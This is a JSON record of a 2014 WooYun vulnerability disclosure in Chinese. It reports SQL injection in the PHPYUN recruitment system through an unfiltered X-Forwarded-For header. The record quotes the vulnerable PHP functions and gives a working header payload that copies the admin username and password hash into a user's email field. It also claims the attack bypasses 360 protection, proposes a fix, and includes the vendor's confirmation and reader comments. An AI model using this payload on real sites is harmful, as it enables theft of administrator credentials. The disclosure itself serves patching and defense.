{"id": 517, "wybug_id": "wooyun-2014-069541", "wybug_title": "PHPYUN多处SQL注入及快速定位（无视360防御）", "wybug_corp": "php云人才系统", "wybug_author": "xfkxfk", "wybug_date": "2014-07-24 15:15", "wybug_open_date": "2014-10-22 15:16", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-27：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-22：\t细节向公众公开  简要描述： 好久没更新漏洞了看最近小伙伴又在刷phpyun的，phpyun的安全防御应该做的算不错的，怎么还有漏洞？！然后下了一个看了下，累死了，终于找到一处问题，引发几处SQL注入。这里快速找出问题，只要很简单就可以修复完成！ 详细说明：  其他地方的估计被小伙伴们都挖完了，我们来看看不常被大家关注的地方在QQ登陆这里qqconnect.class.php文件我们来看看qq登陆时，会绑定这个qq的相关信息：\nfunction qqbind_action()\t{\t\tif(($_GET['usertype']=='1' || $_GET['usertype']=='2') && $_SESSION['qq']['openid'])\t\t{\t\t\t\t$usertype = $_GET['usertype'];\t\t\t\t$ip = $this->obj->fun_ip_get();\t\t\t\t$time = time();\t\t\t\t$salt = substr(uniqid(rand()), -6);\t\t\t\t$pass = md5(md5($salt).$salt);  \t\t\t\t$username = $this->checkuser($_SESSION['qq']['nickname'],$_SESSION['qq']['nickname']);\t\t\t\t\t$userid=$this->obj->DB_insert_once(\"member\",\"`username`='$username',`password`='$pass',`usertype`='$usertype',`status`='1',`salt`='$salt',`reg_date`='$time',`reg_ip`='$ip',`qqid`='\".$_SESSION['qq']['openid'].\"'\"); \t\t\t\tif(!$userid)\t\t\t\t{\t\t\t\t\t$user = $this->obj->DB_select_once(\"member\",\"`username`='\".$username.\"'\",\"`uid`\");\t\t\t\t\t$userid = $user['uid'];\t\t\t\t\t$email = $user['email'];\t\t\t\t}\nphpyun里面get，post，cookie基本上被过滤的差不多了都我们来看看这里的$ip = $this->obj->fun_ip_get();/model/class/action.class.php\nfunction fun_ip_get() {\t\tif (getenv(\"HTTP_CLIENT_IP\") && strcasecmp(getenv(\"HTTP_CLIENT_IP\"), \"unknown\")) {\t\t\t$ip = getenv(\"HTTP_CLIENT_IP\");\t\t} else\t\t\tif (getenv(\"HTTP_X_FORWARDED_FOR\") && strcasecmp(getenv(\"HTTP_X_FORWARDED_FOR\"), \"unknown\")) {\t\t\t\t$ip = getenv(\"HTTP_X_FORWARDED_FOR\");\t\t\t} else\t\t\t\tif (getenv(\"REMOTE_ADDR\") && strcasecmp(getenv(\"REMOTE_ADDR\"), \"unknown\")) {\t\t\t\t\t$ip = getenv(\"REMOTE_ADDR\");\t\t\t\t} else\t\t\t\t\tif (isset ($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], \"unknown\")) {\t\t\t\t\t\t$ip = $_SERVER['REMOTE_ADDR'];\t\t\t\t\t} else {\t\t\t\t\t\t$ip = \"unknown\";\t\t\t\t\t}\t\treturn ($ip);\t}\n奇怪，这里为什么没有任何防御咧？！！！phpyun的小伙伴搞什么飞机哦！？这么明显的XFF注入，怎么没有防御咧？！好吧。。。我们来看看还有没有其他地方使用了这个fun_ip_get函数：\n\n来看看这里的login.class.php文件\nfunction loginsave_action()\t{\t\t$username=iconv(\"utf-8\",\"gbk\",$_POST['username']);\t\tif($_COOKIE['uid']!=\"\"&&$_COOKIE['username']!=\"\")\t\t{\t\t\t$this->ajaxlogin($_POST['comid'],\"您已经登陆了，您不是个人用户！\");\t\t\techo \"您已经登录了！\";die;\t\t}......$time = time();\t\t\t\t\t\t\t$ip = $this->obj->fun_ip_get();\t\t\t\t\t\t\t$this->obj->DB_update_all(\"member\",\"`login_ip`='$ip',`login_date`='$time',`login_hits`=`login_hits`+1\",\"`uid`='\".$user['uid'].\"'\");\t\t\t\t\t\t\t$this->unset_cookie();......\n这里也存在SQL注入的再来看看register.class.php文件\nfunction regsave_action(){\t\t$_POST=$this->post_trim($_POST);\t\t$_POST['username']=iconv(\"utf-8\",\"gbk\",$_POST['username']);\t\t$_POST['unit_name']=iconv(\"utf-8\",\"gbk\",$_POST['unit_name']);\t\t$_POST['address']=iconv(\"utf-8\",\"gbk\",$_POST['address']);\t\tif($_COOKIE['uid']!=\"\"&&$_COOKIE['username']!=\"\"){\t\t\techo \"8##您已经登录了！\";die;\t\t}\t\t$usertype=$_POST['usertype'];\t\tif(strstr($this->config['code_web'],'注册会员')){\t\t\tif(md5($_POST['authcode'])!=$_SESSION['authcode']){\t\t\t\techo \"8##验证码错误！\";die;\t\t\t}\t\t}......$ip = $this->obj->fun_ip_get();\t\t\t$data['username']=$_POST['username'];\t\t\t$data['password']=$pass;\t\t\t$data['moblie']=$_POST['moblie'];\t\t\t$data['email']=$_POST['email'];\t\t\t$data['usertype']=$_POST['usertype'];\t\t\t$data['status']=$satus;\t\t\t$data['salt']=$salt;\t\t\t$data['reg_date']=time();\t\t\t$data['reg_ip']=$ip;\t\t\t$data['qqid']=$_SESSION['qq']['openid'];\t\t\t$data['sinaid']=$_SESSION['sinaid'];\t\t\t$userid=$this->obj->insert_into(\"member\",$data);......\n但是这里的insert_into有过滤，无法注入成功，但是问题点依然存在。通过上面的方法，找出全部使用此问题函数的地方，就能快速登陆到漏洞所在。其他的就不一一验证了。   漏洞证明：  我们拿第一处QQ登陆看看首先设置我们的X-Forwarded-For\nX-Forwarded-For：127.0.0.1',`email`=(select concat(username,0x23,password) from phpyun_admin_user limit 1)#\n\n\n然后使用QQ登陆我们来看看SQL执行日志：\n\n然后登陆成功后用户的email就会被修改\n\n   修复方案：  有两个声明fun_ip_get函数的地方/include/public.function.php/model/class/action.class.php第一个过滤，但是没在上面使用第二个没过滤，使用在了上面的地方所以这把第二个地方的函数过滤处理就ok了。   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-07-24 15:28 厂商回复： 问题确实存在，感谢提供！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-24 16:38 |    \t\tPgHook \t\t\t( 普通白帽子  |\t\t\t        Rank:964 漏洞数:115        | ...........................................)\t\t \n  霸气啊！！ 无视360防御    \n     2014-07-25 13:37 |    \t\tTixe \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        )\t\t \n  霸气啊！！ 无视360防御    \n     2014-07-29 17:29 |    \t\t小杨 \t\t\t( 路人 |\t\t\t        Rank:22 漏洞数:4        | 。)\t\t \n  霸气啊！！ 无视360防御    \n     2014-10-22 23:56 |    \t\tnoob \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:18        | 向各位大神学习，向各位大神致敬)\t\t \n  涨姿势了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}